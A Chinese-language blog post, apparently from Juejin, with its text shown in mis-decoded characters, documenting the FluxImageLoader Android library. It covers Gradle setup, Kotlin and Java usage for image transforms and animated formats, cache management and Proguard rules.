.task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17ce8903392a42e2b9f32bb3f86bc516~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmVydmU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765794812&amp;x-signature=EGo%2B7ZnrEicWrTIiiu97g%2FEDggA%3D" alt="ScreenShot_2025-12-08_180655_892.png" loading="lazy"/></p>
<h2 data-id="heading-0">FluxImageLoader</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fopensource.org%2Flicenses%2FApache-2.0" target="_blank" title="https://opensource.org/licenses/Apache-2.0" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/228aa39a27be4d36aa5a5d01da7bf552~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmVydmU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765794812&amp;x-signature=XuH5o0kA0l6iLeSkgEo0AvAG9%2Bw%3D" alt="License" loading="lazy"/></a>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fjitpack.io%2F%23darryrzhong%2FFluxImageLoader" target="_blank" title="https://jitpack.io/#darryrzhong/FluxImageLoader" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daff64ef7c184093874f2252931cc1be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmVydmU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765794812&amp;x-signature=ing%2Bb7dnPJmhAxPPs5oGIkThr30%3D" alt="" loading="lazy"/></a></p>
<p>FluxImageLoader æ˜¯ä¸€ä¸ªåŸºäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fcoil-kt.github.io%2Fcoil%2F" target="_blank" title="https://coil-kt.github.io/coil/" ref="nofollow noopener noreferrer">Coil3</a> + <a href="https://link.juejin.cn?target=https%3A%2F%2Fsquare.github.io%2Fokhttp%2F" target="_blank" title="https://square.github.io/okhttp/" ref="nofollow noopener noreferrer">OkHttp</a> å°è£…çš„ Android å›¾ç‰‡åŠ è½½åº“ï¼Œæ—¨åœ¨æä¾›ç®€å•ã€é«˜æ•ˆä¸”åŠŸèƒ½ä¸°å¯Œçš„å›¾ç‰‡åŠ è½½è§£å†³æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-1"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdarryrzhong%2FFluxImageLoader" target="_blank" title="https://github.com/darryrzhong/FluxImageLoader" ref="nofollow noopener noreferrer">GitHub</a></h2>
<h3 data-id="heading-2">åŠŸèƒ½ç‰¹æ€§</h3>
<ul>
<li><strong>åŸºäº Coil3</strong>: äº«å— Coil3 å¸¦æ¥çš„ç°ä»£ kotlinå›¾ç‰‡åŠ è½½ä½“éªŒã€‚</li>
<li><strong>å¤šæ ¼å¼æ”¯æŒ</strong>: æ”¯æŒå¸¸è§å›¾ç‰‡æ ¼å¼ä»¥åŠ GIFã€WebP åŠ¨å›¾ã€SVGã€è§†é¢‘å¸§è§£ç ã€‚</li>
<li><strong>è‡ªå®šä¹‰é…ç½®</strong>: æ”¯æŒè‡ªå®šä¹‰å†…å­˜ç¼“å­˜ã€ç£ç›˜ç¼“å­˜å¤§å°åŠè·¯å¾„ã€‚</li>
<li><strong>ä¸°å¯Œå˜æ¢</strong>: å†…ç½®åœ†å½¢ã€åœ†è§’ã€é«˜æ–¯æ¨¡ç³Šç­‰å¸¸ç”¨å›¾ç‰‡å˜æ¢ã€‚</li>
<li><strong>é¢„åŠ è½½/ä¸‹è½½</strong>: æ”¯æŒå›¾ç‰‡é¢„åŠ è½½åˆ°å†…å­˜æˆ–ä»…ä¸‹è½½åˆ°ç£ç›˜ã€‚</li>
<li><strong>Javaå…¼å®¹</strong>: æä¾› <code>FluxLoader</code> å·¥å…·ç±»ï¼Œå®Œç¾å…¼å®¹ Java è°ƒç”¨ã€‚</li>
</ul>
<h3 data-id="heading-3">æ¥å…¥æŒ‡å—</h3>
<p>æœ¬æ–‡æ¡£æä¾›äº†å°† GalleryPicker åº“é›†æˆåˆ°æ‚¨çš„ Android åº”ç”¨ç¨‹åºä¸­çš„è¯¦ç»†æŒ‡å—ã€‚</p>
<h4 data-id="heading-4">1. æ·»åŠ ä¾èµ–</h4>
<p>åœ¨æ‚¨çš„é¡¹ç›® <code>build.gradle</code> æ–‡ä»¶ä¸­æ·»åŠ  JitPack ä»“åº“å’Œä¾èµ–é¡¹ã€‚</p>
<p><strong>æ ¹ç›®å½• <code>build.gradle</code>:</strong></p>
<pre><code class="hljs language-gradle" lang="gradle">allprojects {
    repositories {
        ...
        maven { url 'https://jitpack.io' }
    }
}
</code></pre>
<p><strong>App æ¨¡å— <code>build.gradle</code>:</strong></p>
<pre><code class="hljs language-gradle" lang="gradle">dependencies {
    implementation 'com.github.darryrzhong:FluxImageLoader:1.0.0' // è¯·æ£€æŸ¥æœ€æ–°ç‰ˆæœ¬
}
</code></pre>
<h3 data-id="heading-5">å¿«é€Ÿå¼€å§‹</h3>
<h4 data-id="heading-6">1. åˆå§‹åŒ–</h4>
<p>åœ¨ Application çš„ <code>onCreate</code> æ–¹æ³•ä¸­è¿›è¡Œåˆå§‹åŒ–é…ç½®ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.flux.img.FluxImageLoader

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplication</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        
        <span class="hljs-comment">// åˆå§‹åŒ–é…ç½®</span>
        FluxImageLoader.getInstance()
            .setMaxMemorySizePercent(<span class="hljs-number">0.25</span>) <span class="hljs-comment">// æœ€å¤§å†…å­˜ç¼“å­˜æ¯”ä¾‹ (Appå¯ç”¨å†…å­˜ç™¾åˆ†æ¯”)</span>
            .setMaxDiskSizePercent(<span class="hljs-number">0.02</span>)   <span class="hljs-comment">// æœ€å¤§ç£ç›˜ç¼“å­˜æ¯”ä¾‹ (ç”¨æˆ·å¯ç”¨ç£ç›˜ç™¾åˆ†æ¯”)</span>
            .setDiskCacheFileName(<span class="hljs-string">"coil_image_cache"</span>) <span class="hljs-comment">// ç£ç›˜ç¼“å­˜ç›®å½•åç§°</span>
            .debug(BuildConfig.DEBUG)      <span class="hljs-comment">// å¼€å¯è°ƒè¯•æ—¥å¿—</span>
            .<span class="hljs-keyword">init</span>(<span class="hljs-keyword">this</span>)
    }
}
</code></pre>
<h4 data-id="heading-7">2. æ”¯æŒçš„æ ¼å¼</h4>
<ul>
<li><strong>é™æ€å›¾ç‰‡</strong>: BMP, JPEG, PNG, WebP, HEIF (Android 8.0+)</li>
<li><strong>åŠ¨å›¾</strong>: GIF, WebP (Android 9.0+), HEIF (Android 11.0+)</li>
<li><strong>SVG</strong>: æ”¯æŒ SVG æ ¼å¼è§£ç </li>
<li><strong>è§†é¢‘</strong>: æ”¯æŒåŠ è½½è§†é¢‘æ–‡ä»¶çš„ç¬¬ä¸€å¸§æˆ–æŒ‡å®šå¸§</li>
</ul>
<p align="center">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f070ecb1000c4370a1e59d1bfa96f8b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmVydmU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765794812&amp;x-signature=8Zg%2F3ktYlWWlfpyWkKLqvUOhfvM%3D" alt="pickerè½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" width="206" height="443" loading="lazy"/>
</p>
<h3 data-id="heading-8">ä½¿ç”¨æŒ‡å— (Kotlin)</h3>
<p>æ¨èä½¿ç”¨ Kotlin æ‰©å±•æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼Œç®€æ´é«˜æ•ˆã€‚</p>
<h4 data-id="heading-9">åŸºç¡€åŠ è½½</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.flux.img.load

<span class="hljs-comment">// åŠ è½½ç½‘ç»œå›¾ç‰‡</span>
imageView.load(<span class="hljs-string">"https://www.example.com/image.jpg"</span>)

<span class="hljs-comment">// åŠ è½½æœ¬åœ°æ–‡ä»¶</span>
imageView.load(File(<span class="hljs-string">"/path/to/image.jpg"</span>))

<span class="hljs-comment">// åŠ è½½èµ„æºID</span>
imageView.load(R.drawable.ic_launcher)

<span class="hljs-comment">// è®¾ç½®å ä½å›¾ (é»˜è®¤ä½¿ç”¨å†…ç½®å ä½å›¾ï¼Œä¼  0 æˆ–ä¸ä¼ ä½¿ç”¨é»˜è®¤)</span>
imageView.load(url, placeholder = R.drawable.custom_placeholder)
</code></pre>
<h4 data-id="heading-10">å›¾ç‰‡å˜æ¢</h4>
<h5 data-id="heading-11">åœ†å½¢å›¾ç‰‡</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.flux.img.loadCircle

imageView.loadCircle(url)
</code></pre>
<h5 data-id="heading-12">åœ†è§’å›¾ç‰‡</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.flux.img.loadRounded
<span class="hljs-keyword">import</span> com.flux.img.transform.RoundedCornersType
<span class="hljs-keyword">import</span> com.flux.loader.dp <span class="hljs-comment">// å‡è®¾ä½ æœ‰ dp æ‰©å±•ï¼Œæˆ–è€…ç›´æ¥ä¼  px å€¼</span>

<span class="hljs-comment">// ç»Ÿä¸€åœ†è§’</span>
imageView.loadRounded(url, radius = <span class="hljs-number">20f</span>)

<span class="hljs-comment">// æŒ‡å®šåœ†è§’ä½ç½® (ä¾‹å¦‚ï¼šå·¦ä¸Šå’Œå³ä¸Š)</span>
imageView.loadRounded(url, radius = <span class="hljs-number">20f</span>, cornersType = RoundedCornersType.TOP)
</code></pre>
<h5 data-id="heading-13">é«˜æ–¯æ¨¡ç³Š</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.flux.img.loadBlur

<span class="hljs-comment">// åŸºç¡€é«˜æ–¯æ¨¡ç³Š (é»˜è®¤æ¨¡ç³ŠåŠå¾„ 10f)</span>
imageView.loadBlur(url)

<span class="hljs-comment">// è‡ªå®šä¹‰æ¨¡ç³ŠåŠå¾„å’Œåœ†è§’</span>
<span class="hljs-comment">// radius &gt; 0: åœ†è§’æ¨¡ç³Š</span>
<span class="hljs-comment">// radius &lt; 0: åœ†å½¢æ¨¡ç³Š (-1f)</span>
imageView.loadBlur(url, blurRadius = <span class="hljs-number">15f</span>, radius = <span class="hljs-number">20f</span>)
</code></pre>
<h4 data-id="heading-14">åŠ¨å›¾åŠ è½½</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.flux.img.loadWebpAnim
<span class="hljs-keyword">import</span> com.flux.img.loadGif

<span class="hljs-comment">// åŠ è½½ WebP åŠ¨å›¾ (Android 9.0+ ä½¿ç”¨ Coilï¼Œ9.0ä»¥ä¸‹è‡ªåŠ¨é™çº§ä½¿ç”¨ Glide)</span>
imageView.loadWebpAnim(<span class="hljs-string">"https://www.example.com/anim.webp"</span>)

<span class="hljs-comment">// åŠ è½½ GIF</span>
imageView.loadGif(<span class="hljs-string">"https://www.example.com/anim.gif"</span>)
</code></pre>
<h4 data-id="heading-15">è·å– Bitmap / Drawable</h4>
<p>å½“ä¸éœ€è¦ç›´æ¥æ˜¾ç¤ºåœ¨ ImageView æ—¶ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.flux.img.loadBitmap
<span class="hljs-keyword">import</span> com.flux.img.loadDrawable
<span class="hljs-keyword">import</span> com.flux.img.listener.LoadListener

<span class="hljs-comment">// è·å– Bitmap</span>
imageView.loadBitmap(url, <span class="hljs-keyword">object</span> : LoadListener&lt;Bitmap&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onSuccess</span><span class="hljs-params">(<span class="hljs-keyword">data</span>: <span class="hljs-type">Bitmap</span>)</span></span> {
        <span class="hljs-comment">// å¤„ç† Bitmap</span>
    }
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onError</span><span class="hljs-params">(throwable: <span class="hljs-type">Throwable</span>)</span></span> {
        <span class="hljs-comment">// å¤„ç†é”™è¯¯</span>
    }
    <span class="hljs-comment">// å¯é€‰: onStart(), onCancel()</span>
})

<span class="hljs-comment">// è·å– Drawable</span>
imageView.loadDrawable(url, <span class="hljs-keyword">object</span> : LoadListener&lt;Drawable&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onSuccess</span><span class="hljs-params">(<span class="hljs-keyword">data</span>: <span class="hljs-type">Drawable</span>)</span></span> {
        <span class="hljs-comment">// å¤„ç† Drawable</span>
    }
    <span class="hljs-comment">// ...</span>
})
</code></pre>
<h4 data-id="heading-16">é¢„åŠ è½½ä¸ä¸‹è½½</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.flux.img.preload
<span class="hljs-keyword">import</span> com.flux.img.preDownload

<span class="hljs-comment">// é¢„åŠ è½½åˆ°å†…å­˜ (å®ç°ç§’å¼€)</span>
preload(url, context)

<span class="hljs-comment">// é¢„ä¸‹è½½åˆ°ç£ç›˜ (ä¸è§£ç è¿›å†…å­˜ï¼Œé€‚åˆå¹¿å‘Šå›¾ç­‰)</span>
preDownload(url, context, <span class="hljs-keyword">object</span> : LoadListener&lt;<span class="hljs-built_in">Unit</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onSuccess</span><span class="hljs-params">(<span class="hljs-keyword">data</span>: <span class="hljs-type">Unit</span>)</span></span> {
        <span class="hljs-comment">// ä¸‹è½½å®Œæˆ</span>
    }
})
</code></pre>
<h3 data-id="heading-17">ä½¿ç”¨æŒ‡å— (Java)</h3>
<p>Java ä»£ç è¯·ä½¿ç”¨ <code>FluxLoader</code> é™æ€æ–¹æ³•è°ƒç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.flux.img.FluxLoader;

<span class="hljs-comment">// åŸºç¡€åŠ è½½</span>
FluxLoader.load(imageView, url);
FluxLoader.load(imageView, url, R.drawable.placeholder);

<span class="hljs-comment">// åœ†å½¢</span>
FluxLoader.loadCircle(imageView, url);

<span class="hljs-comment">// åœ†è§’</span>
FluxLoader.loadRounded(imageView, url, <span class="hljs-number">20f</span>);

<span class="hljs-comment">// é«˜æ–¯æ¨¡ç³Š</span>
FluxLoader.loadBlur(imageView, url);

<span class="hljs-comment">// é¢„åŠ è½½</span>
FluxLoader.preload(url, context);
</code></pre>
<h3 data-id="heading-18">èµ„æºé‡Šæ”¾</h3>
<p>Coil ä¼šè‡ªåŠ¨ç®¡ç†èµ„æºé‡Šæ”¾ï¼Œåœ¨ä»¥ä¸‹æƒ…å†µè‡ªåŠ¨å–æ¶ˆè¯·æ±‚ï¼š</p>
<ul>
<li>View æ‰€åœ¨çš„ Lifecycle è¿›å…¥ DESTROYED çŠ¶æ€</li>
<li>View è¢«è§£ç»‘ (Detached)</li>
</ul>
<p>æ‰‹åŠ¨å–æ¶ˆè¯·æ±‚ (ä»… Kotlin æ‰©å±•æ”¯æŒè¿”å› Disposable):</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> disposable = imageView.load(url)
disposable.dispose()
</code></pre>
<h4 data-id="heading-19">ç¼“å­˜æ¸…ç†</h4>
<p><code>FluxImageLoader</code> æä¾›äº†æ‰‹åŠ¨ç®¡ç†ç¼“å­˜çš„æ–¹æ³•ï¼Œå»ºè®®åœ¨ <code>Application</code> çš„ç”Ÿå‘½å‘¨æœŸå›è°ƒä¸­åˆç†è°ƒç”¨ä»¥ä¼˜åŒ–å†…å­˜ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ¸…é™¤å†…å­˜ç¼“å­˜ (å»ºè®®åœ¨ onLowMemory ä¸­è°ƒç”¨)</span>
FluxImageLoader.getInstance().clearMemoryCache(context)

<span class="hljs-comment">// æ¸…é™¤ç£ç›˜ç¼“å­˜</span>
FluxImageLoader.getInstance().clearDiskCache(context)

<span class="hljs-comment">// æ•´ç†å†…å­˜ç¼“å­˜ (å»ºè®®åœ¨ onTrimMemory ä¸­è°ƒç”¨)</span>
FluxImageLoader.getInstance().trimMemoryCache(context)
</code></pre>
<p>ç¤ºä¾‹ (åœ¨ Application ä¸­):</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onLowMemory</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">super</span>.onLowMemory()
    <span class="hljs-comment">// ç³»ç»Ÿå†…å­˜ç´§å¼ ï¼Œç«‹å³æ¸…ç†å†…å­˜ç¼“å­˜</span>
    FluxImageLoader.getInstance().clearMemoryCache(<span class="hljs-keyword">this</span>)
}

<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onTrimMemory</span><span class="hljs-params">(level: <span class="hljs-type">Int</span>)</span></span> {
    <span class="hljs-keyword">super</span>.onTrimMemory(level)
    <span class="hljs-keyword">when</span> (level) {
        <span class="hljs-comment">// App åˆ‡åˆ°åå°ï¼ŒUI ä¸å¯è§ || åå° App å†…å­˜ä½</span>
        ComponentCallbacks2.TRIM_MEMORY_UI_HIDDEN, ComponentCallbacks2.TRIM_MEMORY_BACKGROUND -&gt; {
            FluxImageLoader.getInstance().trimMemoryCache(<span class="hljs-keyword">this</span>)
        }
    }
}
</code></pre>
<h3 data-id="heading-20">æ³¨æ„äº‹é¡¹</h3>
<ul>
<li><code>@DrawableRes</code> èµ„æºå»ºè®®ç›´æ¥ä½¿ç”¨ <code>setImageResource</code>ï¼Œä½¿ç”¨åŠ è½½å™¨ä¼šäº§ç”Ÿä¸å¿…è¦çš„å¼€é”€ï¼Œé™¤ééœ€è¦åšå›¾ç‰‡å˜æ¢ã€‚</li>
<li>é«˜æ–¯æ¨¡ç³ŠåŠå¾„å¿…é¡»åœ¨ 0-25 ä¹‹é—´ã€‚</li>
<li>ç”±äºCoil3åº“ä»…æ”¯æŒåœ¨ Android API 28 ä»¥ä¸ŠåŠ è½½åŠ¨æ€ WebP å›¾ç‰‡,å¦‚æœéœ€è¦åœ¨ Android API 28 ä»¥ä¸‹åŠ è½½åŠ¨æ€ WebP å›¾ç‰‡ï¼Œè¯·è‡ªè¡Œä¾èµ– Glide åŠå…¶ WebP è§£ç åº“ã€‚</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">def GLIDE_VERSION = <span class="hljs-string">"5.0.5"</span>
<span class="hljs-comment">// webpdecoder</span>
implementation <span class="hljs-string">"com.github.zjupure:webpdecoder:2.7.4.16.0"</span>
<span class="hljs-comment">// glide 4.10.0+</span>
implementation <span class="hljs-string">"com.github.bumptech.glide:glide:<span class="hljs-subst">${GLIDE_VERSION}</span>"</span>
kapt <span class="hljs-string">"com.github.bumptech.glide:compiler:<span class="hljs-subst">${GLIDE_VERSION}</span>"</span>
</code></pre>
<h3 data-id="heading-21">Proguard</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">-keep <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.<span class="hljs-title">bumptech</span>.<span class="hljs-title">glide</span>.<span class="hljs-title">integration</span>.<span class="hljs-title">webp</span>.<span class="hljs-title">WebpImage</span> { *; }
-keep <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.<span class="hljs-title">bumptech</span>.<span class="hljs-title">glide</span>.<span class="hljs-title">integration</span>.<span class="hljs-title">webp</span>.<span class="hljs-title">WebpFrame</span> { *; }
-keep <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">com</span>.<span class="hljs-title">bumptech</span>.<span class="hljs-title">glide</span>.<span class="hljs-title">integration</span>.<span class="hljs-title">webp</span>.<span class="hljs-title">WebpBitmapFactory</span> { *; }

-keep <span class="hljs-keyword">class</span> <span class="hljs-title class_">coil3</span>.<span class="hljs-title">util</span>.<span class="hljs-title">DecoderServiceLoaderTarget</span> { *; }
-keep <span class="hljs-keyword">class</span> <span class="hljs-title class_">coil3</span>.<span class="hljs-title">util</span>.<span class="hljs-title">FetcherServiceLoaderTarget</span> { *; }
-keep <span class="hljs-keyword">class</span> <span class="hljs-title class_">coil3</span>.<span class="hljs-title">util</span>.<span class="hljs-title">ServiceLoaderComponentRegistry</span> { *; }
-keep <span class="hljs-keyword">class</span> * implements coil3.util.DecoderServiceLoaderTarget { *; }
-keep <span class="hljs-keyword">class</span> * implements coil3.util.FetcherServiceLoaderTarget { *; }
</code></pre>
<h3 data-id="heading-22">Acknowledgments</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcoil-kt.github.io%2Fcoil%2F" target="_blank" title="https://coil-kt.github.io/coil/" ref="nofollow noopener noreferrer">Coil3</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbumptech%2Fglide" target="_blank" title="https://github.com/bumptech/glide" ref="nofollow noopener noreferrer">Glide</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzjupure%2FGlideWebpDecoder" target="_blank" title="https://github.com/zjupure/GlideWebpDecoder" ref="nofollow noopener noreferrer">GlideWebpDecoder</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>